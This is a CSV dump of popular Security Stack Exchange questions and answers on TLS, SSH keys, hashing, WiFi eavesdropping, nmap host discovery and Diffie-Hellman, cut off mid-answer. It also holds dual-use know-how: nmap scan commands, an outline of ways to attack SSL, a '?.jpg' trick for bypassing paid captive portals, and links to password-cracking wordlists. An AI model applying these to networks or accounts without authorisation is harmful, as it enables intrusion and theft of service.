title,viewcount,title,body,body,acceptedanswerid
"How to find live hosts on my network?","657646","","<p>I am trying to find the live hosts on my network using nmap. I am scanning the network in Ubuntu using the command <code>sudo nmap -sP 192.168.2.1/24</code>. However, I am unable to find the live hosts. I just get the network address of my own PC as live. When I see the DHCP client list through my browser (my router can be accessed via browser using my network IP), I get around 10 live hosts on the network. Can anyone tell me the reason why this could be happening and how do I find the live hosts on my network?</p>
","<p>This is the simplest way of performing <strong>host discovery</strong> with nmap.</p>

<pre><code>nmap -sP 192.168.2.1/24
</code></pre>

<p><strong>Why does it not work all the time ?</strong></p>

<p>When this command runs nmap tries to ping the given IP address range to check if the hosts are alive. If ping fails it tries to send syn packets to port 80 (SYN scan). This is not hundred percent reliable because modern host based firewalls block ping and port 80. Windows firewall blocks ping by default. The hosts you have on the network are blocking ping and the port 80 is not accepting connections. Hence nmap assumes that the host is not up.</p>

<p><strong>So is there a workaround to this problem?</strong></p>

<p>Yes. One of the options that you have is using the -P0 flag which skips the host discovery process and tries to perform a port scan on all the IP addresses (In this case even vacant IP addresses will be scanned). Obviously this will take a large amount of time to complete the scan even if you are in a  small (20-50 hosts) network. but it will give you the results.</p>

<p>The better option would be to specify custom ports for scanning. Nmap allows you to probe specific ports with SYN/UDP packets. It is generally recommended to probe commonly used ports e.g. TCP-22 (ssh) or TCP-3389 (windows remote desktop) or UDP-161 (SNMP). </p>

<pre><code>sudo nmap -sP -PS22,3389 192.168.2.1/24 #custom TCP SYN scan
sudo nmap -sP -PU161 192.168.2.1/24 #custom UDP scan
</code></pre>

<p>N.B. even after specifying custom ports for scanning you may not get an active host. A lot depends on how the host is configured and which services it is using. So you just have keep probing with different combinations.Remember, do not performs scans on a network without proper authorization.</p>

<p><strong>update</strong>: When scanning a network you can never be sure that a particular command will give you all the desired results. The approach should be to start with basic ping sweep and if it doesn't work try guessing the applications that may be running on the hosts and probe the corresponding ports. The idea of using Wireshark is also interesting. You may want to try sending ACK packets.</p>

<pre><code>nmap -sP -PA21,22,25,3389 192.168.2.1/24 #21 is used by ftp
</code></pre>

<p><strong>update two:</strong> The flags -sP and -P0 are now known as -sn and -Pn respectively. However the older flags are still found to be working in the newer versions. </p>
","36200"
"How does SSL/TLS work?","522873","","<p>How does SSL work? I just realised we don't actually have a definitive answer here, and it's something worth covering. </p>

<p>I'd like to see details in terms of:</p>

<ul>
<li>A high level description of the protocol.</li>
<li>How the key exchange works.</li>
<li>How authenticity, integrity and confidentiality are enforced.</li>
<li>What the purpose of having CAs is, and how they issue certificates.</li>
<li>Details of any important technologies and standards (e.g. PKCS) that are involved.</li>
</ul>
","<h1>General</h1>

<p>SSL (and its successor, <a href=""http://en.wikipedia.org/wiki/Secure_Sockets_Layer"" rel=""noreferrer"">TLS</a>) is a protocol that operates directly on top of TCP (although there are also implementations for datagram based protocols such as UDP). This way, protocols on higher layers (such as HTTP) can be left unchanged while still providing a secure connection. Underneath the SSL layer, HTTP is identical to HTTPS.</p>

<p>When using SSL/TLS correctly, all an attacker can see on the cable is which IP and port you are connected to, roughly how much data you are sending, and what encryption and compression is used. He can also terminate the connection, but both sides will know that the connection has been interrupted by a third party.</p>

<p>In typical use, the attacker will also be able to figure out which host name you're connecting to (but not the rest of the URL): although HTTPS itself does not expose the host name, your browser will usually need to make a DNS request first to find out what IP address to send the request to.</p>

<h1>High-level description of the protocol</h1>

<p>After building a TCP connection, the SSL handshake is started by the client. The client (which can be a browser as well as any other program such as Windows Update or PuTTY) sends a number of specifications: </p>

<ul>
<li>which <strong>version of SSL/TLS</strong> it is running, </li>
<li>what <strong>ciphersuites</strong> it wants to use, and </li>
<li>what <strong>compression methods</strong> it wants to use. </li>
</ul>

<p>The server checks what the highest SSL/TLS version is that is supported by them both, picks a ciphersuite from one of the client's options (if it supports one), and optionally picks a compression method.</p>

<p>After this the basic setup is done, the server sends its certificate. This certificate must be trusted by either the client itself or a party that the client trusts. For example if the client trusts GeoTrust, then the client can trust the certificate from Google.com, because GeoTrust <a href=""http://en.wikipedia.org/wiki/Digital_signature"" rel=""noreferrer"">cryptographically signed</a> Google's certificate.</p>

<p>Having verified the certificate and being certain this server really is who he claims to be (and not a man in the middle), a key is exchanged. This can be a public key, a ""PreMasterSecret"" or simply nothing, depending on the chosen ciphersuite. Both the server and the client can now compute the key for the <a href=""http://en.wikipedia.org/wiki/Symmetric-key_algorithm"" rel=""noreferrer"">symmetric encryption</a> <sup><a href=""https://security.stackexchange.com/questions/3657/symmetric-encryption-session-keys-in-ssl-tls"">whynot PKE?</a></sup>. The client tells the server that from now on, all communication will be encrypted, and sends an encrypted and authenticated message to the server.</p>

<p>The server verifies that the MAC (used for authentication) is correct, and that the message can be correctly decrypted. It then returns a message, which the client verifies as well.</p>

<p>The handshake is now finished, and the two hosts can communicate securely. For more info, see <a href=""http://technet.microsoft.com/en-us/library/cc785811(v=ws.10).aspx"" rel=""noreferrer"">technet.microsoft.com/en-us/library/cc785811</a> and <a href=""http://en.wikipedia.org/wiki/Secure_Sockets_Layer#TLS_handshake_in_detail"" rel=""noreferrer"">en.wikipedia.org/wiki/Secure_Sockets_Layer</a>.</p>

<p>To close the connection, a close_notify 'alert' is used. If an attacker tries to terminate the connection by finishing the TCP connection (injecting a FIN packet), both sides will know the connection was improperly terminated. The connection cannot be compromised by this though, merely interrupted.</p>

<h1>Some more details</h1>

<strong>Why can you trust Google.com by trusting GeoTrust?</strong>

<p>A website wants to communicate with you securely. In order to prove its identity and make sure that it is not an attacker, you must have the server's <a href=""http://en.wikipedia.org/wiki/Public-key_cryptography"" rel=""noreferrer"">public key</a>. However, you can hardly store all keys from all websites on earth, the database would be huge and updates would have to run every hour!</p>

<p>The solution to this are Certificate Authorities, or CA for short. When you installed your operating system or browser, a list of trusted CAs probably came with it. This list can be modified at will; you can remove whom you don't trust, add others, or even make your own CA (though you will be the only one trusting this CA, so it's not much use for public website). In this CA list, the CA's public key is also stored.</p>

<p>When Google's server sends you its certificate, it also mentions it is signed by GeoTrust. If you trust GeoTrust, you can verify (using GeoTrust's public key) that GeoTrust really did sign the server's certificate. To sign a certificate yourself, you need the private key, which is only known to GeoTrust. This way an attacker cannot sign a certificate himself and incorrectly claim to be Google.com. When the certificate has been modified by even one bit, the sign will be incorrect and the client will reject it.</p>

<strong>So if I know the public key, the server can prove its identity?</strong>

<p>Yes. Typically, the public key encrypts and the private key decrypts. Encrypt a message with the server's public key, send it, and if the server can repeat back the original message, it just proved that it got the private key without revealing the key.</p>

<p>This is why it is so important to be able to trust the public key: anyone can generate a private/public key pair, also an attacker. You don't want to end up using the public key of an attacker!</p>

<p>If one of the CAs that you trust is compromised, an attacker can use the stolen private key to sign a certificate for any website they like. When the attacker can send a forged certificate to your client, signed by himself with the private key from a CA that you trust, your client doesn't know that the public key is a forged one, signed with a stolen private key.</p>

<strong>But a CA can make me trust any server they want!</strong>

<p>Yes, and that is where the trust comes in. You have to trust the CA not to make certificates as they please. When organisations like Microsoft, Apple and Mozilla trust a CA though, the CA must have audits; another organisation checks on them periodically to make sure everything is still running according to the rules.</p>

<p>Issuing a certificate is done if, and only if, the registrant can prove they own the domain that the certificate is issued for.</p>

<strong>What is this MAC for message authentication?</strong>

<p>Every message is signed with a so-called <a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""noreferrer"">Message Authentication Code</a>, or MAC for short. If we agree on a key and hashing cipher, you can verify that my message comes from me, and I can verify that your message comes from you.</p>

<p>For example with the key ""correct horse battery staple"" and the message ""example"", I can compute the MAC ""58393"". When I send this message with the MAC to you (you already know the key), you can perform the same computation and match up the computed MAC with the MAC that I sent.</p>

<p>An attacker can modify the message, but does not know the key. He cannot compute the correct MAC, and you will know the message is not authentic.</p>

<p>By including a sequence number when computing the MAC, you can eliminate <a href=""http://en.wikipedia.org/wiki/Replay_attack"" rel=""noreferrer"">replay attacks</a>. <a href=""http://stason.org/TULARC/security/ssl-talk/4-1-Does-SSL-protect-users-from-replay-attack-by-eavesdropp.html"" rel=""noreferrer"">SSL does this.</a></p>

<strong>You said the client sends a key, which is then used to setup symmetric encryption. What prevents an attacker from using it?</strong>

<p>The server's public key does. Since we have verified that the public key really belongs to the server and no one else, we can encrypt the key using the public key. When the server receives this, he can decrypt it with the private key. When anyone else receives it, they cannot decrypt it.</p>

<p>This is also why key size matters: The larger the public and private key, the harder it is to crack the key that the client sends to the server.</p>

<h1>How to crack SSL</h1>

<p><strong>In summary</strong>:</p>

<ul>
<li>Try if the user ignores certificate warnings;</li>
<li>The application may load data from an unencrypted channel (e.g. http), which can be tampered with;</li>
<li>An unprotected login page that submits to HTTPS may be modified so that it submits to HTTP;</li>
<li>Unpatched applications may be vulnerable for exploits like BEAST and CRIME;</li>
<li>Resort to other methods such as a physical attack;</li>
<li>Exploit <a href=""https://www.eff.org/https-everywhere/faq#threats"" rel=""noreferrer"">side channels</a> like message length and the <strong>time</strong> taken to form the message;</li>
<li>Wait for <a href=""https://security.stackexchange.com/a/3660/2379"">quantum attacks</a>.</li>
</ul>

<p>See also: <a href=""http://blog.ivanristic.com/SSL_Threat_Model.png"" rel=""noreferrer"">A scheme with many attack vectors against SSL by Ivan Ristic</a> <sup>(png)</sup></p>

<p><strong>In detail:</strong></p>

<p>There is no simple and straight-forward way; SSL is secure when done correctly. An attacker can try if the user ignores <a href=""http://www.page-zone.com/SSL-warning-cpanel.jpg"" rel=""noreferrer"">certificate warnings</a> though, which would break the security instantly. When a user does this, the attacker doesn't need a private key from a CA to forge a certificate, he merely has to send a certificate of his own.</p>

<p>Another way would be by a flaw in the application (server- or client-side). An easy example is in websites: if one of the resources used by the website (such as an image or a script) is loaded over HTTP, the confidentiality cannot be guaranteed anymore. Even though browsers do not send the HTTP Referer header when requesting non-secure resources from a secure page (<a href=""http://www.w3.org/Protocols/rfc2616/rfc2616-sec15.html#sec15.1.3"" rel=""noreferrer"">source</a>), it is still possible for someone eavesdropping on traffic to guess where you're visiting from; for example, if they know images X, Y, and Z are used on one page, they can guess you are visiting that page when they see your browser request those three images at once. Additionally, when loading Javascript, the entire page can be compromised. An attacker can execute any script on the page, modifying for example to whom the bank transaction will go.</p>

<p>When this happens (a resource being loaded over HTTP), the browser gives a mixed-content warning: <a href=""https://i.stack.imgur.com/AbhbG.png"" rel=""noreferrer"">Chrome</a>, <a href=""https://i.stack.imgur.com/XXMN5.png"" rel=""noreferrer"">Firefox</a>, <a href=""http://ie.microsoft.com/testdrive/ieblog/2011/Jun/23_InternetExplorer9SecurityPart4ProtectingConsumersfromMaliciousMixedContent_2.png"" rel=""noreferrer"">Internet Explorer 9</a></p>

<p>Another trick for HTTP is when the login page is not secured, and it submits to an https page. ""Great,"" the developer probably thought, ""now I save server load and the password is still sent encrypted!"" The problem is <a href=""http://www.thoughtcrime.org/software/sslstrip/"" rel=""noreferrer"">sslstrip</a>, a tool that modifies the insecure login page so that it submits somewhere so that the attacker can read it.</p>

<p>There have also been various attacks in the past few years, such as the <a href=""http://www.securegoose.org/2009/11/tls-renegotiation-vulnerability-cve.html"" rel=""noreferrer"">TLS renegotiation vulnerability</a>, <a href=""http://www.thoughtcrime.org/software/sslsniff/"" rel=""noreferrer"">sslsniff</a>, <a href=""http://luxsci.com/blog/is-ssltls-really-broken-by-the-beast-attack-what-is-the-real-story-what-should-i-do.html"" rel=""noreferrer"">BEAST</a>, and very recently, <a href=""https://security.stackexchange.com/questions/19911/crime-how-to-beat-the-beast-successor"">CRIME</a>. All common browsers are protected against all of these attacks though, so these vulnerabilities are no risk if you are running an up-to-date browser.</p>

<p>Last but not least, you can resort to other methods to obtain the info that SSL denies you to obtain. If you can already see and tamper with the user's connection, it might not be that hard to replace one of his/her .exe downloads with a keylogger, or simply to physically attack that person. Cryptography may be rather secure, but humans and human error is still a weak factor. According to <a href=""http://www.verizonbusiness.com/resources/reports/rp_data-breach-investigations-report-2012_en_xg.pdf"" rel=""noreferrer"">this paper by Verizon</a>, 10% of the data breaches involved physical attacks (see page 3), so it's certainly something to keep in mind.</p>
","20833"
"What's the difference between SSL, TLS, and HTTPS?","419100","","<p>I get confused with the terms in this area. What is SSL, TLS, and HTTPS? What are the differences between them?</p>
","<p>TLS is the new name for SSL. Namely, SSL protocol got to version 3.0; TLS 1.0 is ""SSL 3.1"". TLS versions currently defined include TLS 1.1 and 1.2. Each new version adds a few features and modifies some internal details. We sometimes say ""SSL/TLS"".</p>

<p>HTTPS is HTTP-within-SSL/TLS. SSL (TLS) establishes a secured, bidirectional tunnel for arbitrary binary data between two hosts. HTTP is a protocol for sending requests and receiving answers, each request and answer consisting of detailed headers and (possibly) some content. HTTP is meant to run over a bidirectional tunnel for arbitrary binary data; when that tunnel is an SSL/TLS connection, then the whole is called ""HTTPS"".</p>

<p>To explain the acronyms:</p>

<ul>
<li>""SSL"" means ""Secure Sockets Layer"". This was coined by the inventors of the first versions of the protocol, Netscape (the company was later bought by AOL).</li>
<li>""<a href=""http://en.wikipedia.org/wiki/Transport_layer_security"" rel=""noreferrer"">TLS</a>"" means ""Transport Layer Security"". The name was changed to avoid any legal issues with Netscape so that the protocol could be ""open and free"" (and published as a <a href=""http://tools.ietf.org/html/rfc2246"" rel=""noreferrer"">RFC</a>). It also hints at the idea that the protocol works over any bidirectional stream of bytes, not just Internet-based sockets.</li>
<li>""<a href=""http://en.wikipedia.org/wiki/Https"" rel=""noreferrer"">HTTPS</a>"" is supposed to mean ""HyperText Transfer Protocol Secure"", which is grammatically unsound. Nobody, except the terminally bored pedant, ever uses the translation; ""HTTPS"" is better thought of as ""HTTP with an S that means SSL"". Other protocol acronyms have been built the same way, e.g. SMTPS, IMAPS, FTPS... all of them being a bare protocol that ""got secured"" by running it within some SSL/TLS.</li>
</ul>
","5127"
"RSA vs. DSA for SSH authentication keys","365120","","<p>When generating SSH authentication keys on a Unix/Linux system with <code>ssh-keygen</code>, you're given the choice of creating a RSA or DSA key pair (using <code>-t type</code>).</p>

<p>What is the difference between RSA and DSA keys? What would lead someone to choose one over the other?</p>
","<p>Go with RSA. </p>

<p>DSA is faster for signature generation but slower for validation, slower when encrypting but faster when decrypting and security can be considered equivalent compared to an RSA key of equal key length. That's the punch line, now some justification.</p>

<p>The security of the RSA algorithm is based on the fact that <a href=""http://en.wikipedia.org/wiki/Integer_factorization"">factorization of large integers</a> is known to be ""difficult"", whereas DSA security is based on the <a href=""http://en.wikipedia.org/wiki/Discrete_logarithm"">discrete logarithm</a> problem. Today the fastest known algorithm for factoring large integers is the <a href=""http://en.wikipedia.org/wiki/General_number_field_sieve"">General Number Field Sieve</a>, also the fastest algorithm to solve the discrete logarithm problem in finite fields modulo a large prime p as specified for DSA.</p>

<p>Now, if the security can be deemed as equal, we would of course favour the algorithm that is faster. But again, there is no clear winner.</p>

<p>You may have a look at <a href=""http://msdn.microsoft.com/en-us/library/ms978415.aspx"">this study</a> or, if you have OpenSSL installed on your machine, run <code>openssl speed</code>. You will see that DSA performs faster in generating a signature but much slower when verifying a signature of the same key length. Verification is generally what you want to be faster if you deal e.g. with a signed document. The signature is generated once - so it's fine if this takes a bit longer - but the document signature may be verified much more often by end users.</p>

<p>Both do support some form of encryption method, RSA out of the box and DSA using an <a href=""http://en.wikipedia.org/wiki/ElGamal_encryption"">El Gamal</a>. DSA is generally faster in decryption but slower for encryption, with RSA it's the other way round. Again you want decryption to be faster here because one encrypted document might be decrypted many times.</p>

<p>In commercial terms, RSA is clearly the winner, commercial RSA certificates are much more widely deployed than DSA certificates.</p>

<p>But I saved the killer argument for the end: <code>man ssh-keygen</code> says that a DSA key has to be exactly 1024 bits long to be compliant with NIST's <a href=""http://csrc.nist.gov/publications/fips/archive/fips186-2/fips186-2.pdf"">FIPS 186-2</a>. So although in theory longer DSA keys are possible (FIPS 186-3 also explicitly allows them) you are still restricted to 1024 bits. And if you take the considerations of this [article], we are no longer secure with 1024 bits for either RSA or DSA. </p>

<p><strong>So today, you are better of with an RSA 2048 bit key.</strong></p>
","5100"
"How do I clear cached credentials from my Windows Profile?","348242","","<p>Windows seems to be saving my credentials for a variety of applications (terminal servers, etc) and I'd like to purge this data.</p>

<p>How can I backup and purge this data?</p>
","<p>The utility to delete cached credentials is hard to find.  It stores both certificate data and also user passwords.</p>

<p>Open a command prompt, or enter the following in the run command </p>

<pre><code> rundll32.exe keymgr.dll,KRShowKeyMgr
</code></pre>

<p><img src=""https://i.stack.imgur.com/fGJvf.png"" alt=""Image of cached credentials""></p>

<p>Windows 7 makes this easier by creating an icon in the control panel called ""Credential manager""</p>

<p><img src=""https://i.stack.imgur.com/aYQZm.png"" alt=""enter image description here""></p>
","15575"
"How to determine what type of encoding/encryption has been used?","337927","","<p>Is there a way to find what type of encryption/encoding is being used?
For example, I am testing a web application which stores the password in the database in an encrypted format (<code>WeJcFMQ/8+8QJ/w0hHh+0g==</code>). How do I determine what hashing or encryption is being used?</p>
","<p>Your example string (<code>WeJcFMQ/8+8QJ/w0hHh+0g==</code>) is Base64 encoding for a sequence of 16 bytes, which do not look like meaningful ASCII or UTF-8. <em>If</em> this is a value stored for password <em>verification</em> (i.e. not really an ""encrypted"" password, rather a ""hashed"" password) then this is probably the result of a hash function computed over the password; the one classical hash function with a 128-bit output is MD5. But it could be about anything.</p>

<p>The ""normal"" way to know that is to look at the application code. Application code is incarnated in a tangible, fat way (executable files on a server, source code somewhere...) which is not, and cannot be, as much protected as a secret key can. So reverse engineering is the ""way to go"".</p>

<p>Barring reverse engineering, you can make a few experiments to try to make educated guesses:</p>

<ul>
<li>If the same user ""changes"" his password but reuses the same, does the stored value changes ? If yes, then part of the value is probably a randomized ""salt"" or IV (assuming symmetric encryption).</li>
<li>Assuming that the value is deterministic from the password for a given user, if two users choose the same password, does it result in the same stored value ? If no, then the user name is probably part of the computation. You may want to try to compute MD5(""username:password"") or other similar variants, to see if you get a match.</li>
<li>Is the password length limited ? Namely, if you set a 40-character password and cannot successfully authenticate by typing only the first 39 characters, then this means that all characters are important, and this implies that this really is password <em>hashing</em>, not <em>encryption</em> (the stored value is used to verify a password, but the password cannot be recovered from the stored value alone).</li>
</ul>
","4068"
"How do I use ""openssl s_client"" to test for (absence of) SSLv3 support?","335816","","<p>In order to mitigate the <a href=""https://security.stackexchange.com/q/70719/27877"">""Poodle"" vulnerability</a>, I'd like to disable SSLv3 support in my (in this case, TLS, rather than HTTPS) server. How can I use <code>openssl s_client</code> to verify that I've done this?</p>
","<h1>OpenSSL s_client</h1>

<p>To check if you have disabled the SSLv3 support, then run the following</p>

<pre><code>openssl s_client -connect example.com:443 -ssl3
</code></pre>

<p>which should produce something like</p>

<pre><code>3073927320:error:14094410:SSL routines:SSL3_READ_BYTES:sslv3 alert handshake failure:s3_pkt.c:1258:SSL alert number 40
3073927320:error:1409E0E5:SSL routines:SSL3_WRITE_BYTES:ssl handshake failure:s3_pkt.c:596:
</code></pre>

<p>meaning SSLv3 is disabled on the server.  Otherwise the connection will established successfully.</p>

<h1>Nmap</h1>

<p>Alternatively, you can <strong>use nmap</strong> to scan server for supported version:</p>

<pre><code># nmap --script ssl-enum-ciphers example.com
Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-15 03:19 PDT
Nmap scan report for example.com (203.0.113.100)
Host is up (0.090s latency).
rDNS record for 203.0.113.100: edge.example.com
Not shown: 997 filtered ports
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
| ssl-enum-ciphers: 
|   **SSLv3: No supported ciphers found**
|   TLSv1.0: 
</code></pre>
","70737"
"If someone hacks my wi-fi password, what can they see and how?","283689","","<p>If someone knows my wifi password (be it WEP or WPA) what can they see? Do they just see URLs I visit, or can they see everything in my browser, or even everything I do on my computer? Does using HTTPS make any difference?</p>

<p>Secondly, If the attacker does <em>not</em> live nearby, is it possible for them to set up a laptop in my neighbour's house and record all my traffic or otherwise relay the data via the web?</p>
","<blockquote>
  <p>If someone knows my wifi password (be it WEP or WPA) what can they see on my screen? Do they just see URLs I visit, or can they see everything in my browser,....or can they see everything I do on my computer? Does using HTTPS make any difference?</p>
</blockquote>

<p>They can't see anything on your screen (unless you've enabled some sort of unencrypted remote desktop screen sharing program).  </p>

<p>They can however <strong>observe all the data</strong> being sent to and from your computer (I'm assuming for WPA/WPA2 they observed the 4-way handshake at the beginning of each session; or trivially forced your computer to start another handshake), <strong>unless</strong> you encrypted that data using a protocol like HTTPS.  They would typically run a packet capture program like <a href=""http://wiki.wireshark.org/HowToDecrypt802.11"">wireshark</a> to decrypt the wifi encryption.  </p>

<p>Again, they'd be able to see what HTTP webpages you requested, what links you click, the HTML content of the webpages you requested, any information you post to a web site, as well as all data (e.g., any images/movies) sent to you or by you.  They can also interfere with the traffic being sent to you (e.g., alter the content you see).  Granted anyone nearby can always interfere and cause denial of wifi service without knowing your password (e.g., often turning on a microwave oven will interfere with all wifi traffic being sent to you).  Or have their own computer/router that they fully control that sends impersonated messages as you or your router.</p>

<p>If you visit HTTPS sites only, they can't decrypt the data (unless they have somehow additionally compromised your computer).  However, even with HTTPS they can see what IP addresses you are sending/getting data from (though usually the IP address will let them tell what domain e.g., if you went to 69.59.197.21 its <code>stackexchange.com</code>).  They also will know when and how much encrypted data is being sent.  This is possibly enough to give away private information.  Imagine you went to a webpage via HTTPS that had results of your HIV test, and an eavesdropper was listening.  If the web page for a negative result showed 3 images (of specific sizes) and a 10 MB PDF file on safe sex, while the page for positive results had 15 images and three PDF files that were 8MB, 15MB, and 25 MB respectively you may be able to figure out what their results were by observing how much data was sent and when.  This style of attack has been used to figure out what people were searching for on a popular search engine (from the instant results provided for different queries) or roughly estimate what kind of income someone had at an https tax site.  See <a href=""http://research.microsoft.com/pubs/119060/webappsidechannel-final.pdf"">Side-Channel Leaks in Web Appplications (pdf)</a>.</p>

<p>Granted all this information is also available to your ISP as well and to every intermediary router between your computer and the server you are trying to visit.</p>

<blockquote>
  <p>Secondly, if the attacker does NOT live nearby, is it possible for them to set up a laptop in my neighbours house for example, and programatically record all my traffic...or alternatively can they relay the data from the laptop to their own computer elsewhere, via the web?  </p>
</blockquote>

<p>Either is trivial to program up assuming your neighbor doesn't mind them putting a laptop in their house (or they found a power source and place to hide their computer).</p>
","30264"
"How to get MAC address via IP","269401","","<p>I have an IP address of a computer which I am currently away from, and I need the MAC address. 
How do I get the MAC address if I ony have the IP?</p>
","<p>In short the answer will be <strong>you can't</strong>.</p>

<p>It is usually not possible for a person to get the MAC address of a computer from its IP address alone. These two addresses originate from different sources. Simply stated, a computer's own hardware configuration determines its MAC address while the configuration of the network it is connected to determines its IP address.</p>

<p>However, computers connected to the same TCP/IP local network can determine each other's MAC addresses. The technology called ARP - Address Resolution Protocol included with TCP/IP makes it possible. Using ARP, each computer maintains a list of both IP and MAC addresses for each device it has recently communicated with.</p>
","64283"
"How can I export my private key from a Java Keytool keystore?","261912","","<p>I would like to export my private key from a Java Keytool keystore, so I can use it with openssl. How can I do that?</p>
","<p>Since Java 6, you can import/export private keys into PKCS#12 (<code>.p12</code>) files using <code>keytool</code>, using <code>-importkeystore</code> (not available in previous versions).</p>

<p>For example:</p>

<p><code>keytool -importkeystore -srckeystore existing-store.jks -destkeystore new-store.p12 -deststoretype PKCS12</code></p>

<p>The <code>PKCS12</code> keystore type is also supported as a standard keystore type in the default Oracle/Sun security provider.</p>
","3795"
"How to determine if a browser is using an SSL or TLS connection?","247070","","<p>I want to know whether my browser is using SSL or TLS connection if I see HTTPS.</p>

<p>I want to know for IE, Firefox, Chrome and Safari. I want to know the protocol version.</p>
","<p>There are several protocol versions : SSL 2.0, SSL 3.0, TLS 1.0, TLS 1.1 and TLS 1.2. Internally, TLS 1.0/1.1/1.2 are SSL 3.1/3.2/3.3 respectively (the protocol name was changed when SSL became a <a href=""http://tools.ietf.org/html/rfc2246"">standard</a>). I assume that you want to know the exact protocol version that your browser is using.</p>

<p>According to what is described on <a href=""http://www.carbonwind.net/blog/post/%28Funny%29-browsers-SSLTLS-connection-details.aspx"">this blog post</a>, Internet Explorer can display the protocol version information. Just hit <strong>File->Properties</strong> or <strong>Right-click -> Properties</strong>, and a window would open, under <strong>Connection</strong>, you'd see something like:</p>

<blockquote>
  <p>TLS 1.2, RC4 with 128 bit encryption (High); RSA with 2048 bit
  exchange</p>
</blockquote>

<p>As of today, Firefox supports TLS 1.0, TLS 1.1 and TLS 1.2. You can see the negotiated protocol version if you click the <strong>padlock icon</strong> (on the left of the URL), then <strong>More Information</strong> and then under the <strong>Technical Details</strong>.</p>

<p>Chrome can display the version. Click on the <strong>padlock icon</strong>; a popup appears, which contains some details, including the protocol version. example: (verified on version 21.0.1180.82)</p>

<blockquote>
  <p>The connection uses TLS 1.0 </p>
</blockquote>

<p>Opera shows the protocol version in a way similar to Chrome: click on the padlock icon, then click on the ""Details"" button. e.g. (verified on version 12.01):</p>

<blockquote>
  <p>TLS v1.0 256 bit AES (1024 bit DHE_RSA/SHA)</p>
</blockquote>

<p>For browsers which do not show the information, you can always obtain it running a network analyzer like <a href=""http://www.wireshark.org/"">Wireshark</a> or <a href=""http://www.microsoft.com/en-us/download/details.aspx?id=4865"">Network Monitor</a>: they will happily parse the public headers of the SSL/TLS packets, and show you the version (indeed, all of the data transfers in SSL/TLS are done in individual ""records"" and the 5-byte header of each record begins with the protocol version over two bytes).</p>

<p>And, of course, the actual protocol version is a choice of the server, based on what the server is configured to accept and the maximum version announced by the client. If the server is configured to do TLS 1.0 <em>only</em> then any connection which actually happens will use TLS 1.0, necessarily.</p>

<p>(<strong>Edit:</strong> I have incorporated some information from the comments; done a few tests myself. Feel free to enhance this answer as needed.)</p>
","19097"
"Why can you bypass restricted WiFis by adding ""?.jpg"" to the URL?","237724","","<p>I recently read an article on <a href=""http://debuggable.com/posts/hacking-a-commercial-airport-wlan:480f4dd5-50a0-40c6-aa60-4afccbdd56cb"">Hacking a commercial airport WLAN</a>. It's basically about circumventing paid airport WiFi redirections (they redirect you to a certain URL when you type something in the address bar).</p>

<p>You just add <code>?.jpg</code> and tada, you've done it. </p>

<p>My question is: <strong>Why does this work?</strong> </p>
","<p>Most probably the blocker is designed to let images through, maybe because they are hotlinking some images on the page where they ask for you to login.</p>

<p>Appending <code>?.jpg</code> to the URL makes the blocker <em>think</em> that the URL is an image. On the other hand, anything after the <code>?</code> doesn't change the actual webpage requested, it only changes the <code>GET</code> headers. (so <code>http://google.com/?.jpg</code> and <code>http://google.com/</code> give the same page).</p>

<p>Note that if there already is a query string in the URL (something after a question mark), then you must use <code>&amp;.jpg</code> instead of <code>?.jpg</code>, as only the first question mark is considered for making a query string (the second question mark is considered as part of the data, generally, and this may lead to you getting the wrong page)</p>

<p>Basically, when you fetch a page, you can provide additional data to the server (which can then send you a custom page dependant on your data). There are two ways of doing this: a <code>GET</code> request and a <code>POST</code> request. A <code>GET</code> request puts the data in the URL itself, a <code>POST</code> request sends in in a more subtle, 'hidden' way. <a href=""https://superuser.com/questions/ask?title=Hello%20there,%20I%20was%20created%20by%20a%20GET%20request"">Here is an example GET request on the ""ask question"" page of SuperUser</a>. A note: it is not necessary that there is data when you use a <code>GET</code> request. When you fetch a normal webpage, that is also a <code>GET</code> request, without data.</p>
","29832"
"Where can I find good dictionaries for dictionary attacks?","237687","","<p>I’m wondering where I can find good collections of dictionaries which can be used for dictionary attacks? </p>

<p>I've found some through Google, but I’m interested in hearing about where you get your dictionaries from.</p>
","<p>Nice list collected by Ron Bowes you can find here:<br>
<a href=""http://www.skullsecurity.org/wiki/index.php/Passwords"" rel=""noreferrer"">http://www.skullsecurity.org/wiki/index.php/Passwords</a>.  <br></p>

<p>Other list is from InsidePro:<br>
<a href=""http://www.insidepro.com/eng/download.shtml"" rel=""noreferrer"">http://www.insidepro.com/eng/download.shtml</a>.</p>
","1377"
"""Diffie-Hellman Key Exchange"" in plain English","222375","","<p>Can someone explain to me what <strong>Diffie-Hellman Key Exchange</strong> is in plain English? I have read in a non-tech news page that Twitter has just implemented this technology which allows two persons to exchange encrypted messages on top of a non-secured channel. How is that (if this is true)?</p>
","<p>Diffie-Hellman is a way of <em>generating</em> a shared secret between two people in such a way that the secret can't be seen by observing the communication. That's an important distinction: <strong>You're not <em>sharing information</em> during the key exchange, you're <em>creating a key</em> together.</strong> </p>

<p>This is particularly useful because you can use this technique to create an encryption key with someone, and then start encrypting your traffic with that key. And even if the traffic is recorded and later analyzed, there's absolutely no way to figure out what the key was, even though the exchanges that created it may have been visible. This is where <a href=""http://en.wikipedia.org/wiki/Perfect_forward_secrecy"" rel=""noreferrer"">perfect forward secrecy</a> comes from. Nobody analyzing the traffic at a later date can break in because the key was never saved, never transmitted, and never made visible anywhere.</p>

<p>The way it works is reasonably simple. A lot of the math is the same as you see in public key crypto in that a <a href=""http://en.wikipedia.org/wiki/Trapdoor_function"" rel=""noreferrer"">trapdoor function</a> is used. And while the discrete logarithm problem is traditionally used (the <em>x<sup>y</sup> mod p</em> business), the general process can be modified to <a href=""http://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellman"" rel=""noreferrer"">use elliptic curve cryptography as well</a>.</p>

<p>But even though it uses the same underlying principles as public key cryptography, this is <em>not</em> asymmetric cryptography because nothing is ever encrypted or decrypted during the exchange. It is, however, an essential building-block, and was in fact the base upon which asymmetric crypto was later built.</p>

<p>The basic idea works like this:</p>

<ol>
<li>I come up with two prime numbers <strong>g</strong> and <strong>p</strong> and tell you what they are.</li>
<li>You then pick a secret number (<strong>a</strong>), but you don't tell anyone. Instead you compute <strong>g<sup>a</sup></strong> <em>mod</em> <strong>p</strong> and send that result back to me. (We'll call that <strong>A</strong> since it came from <strong>a</strong>).</li>
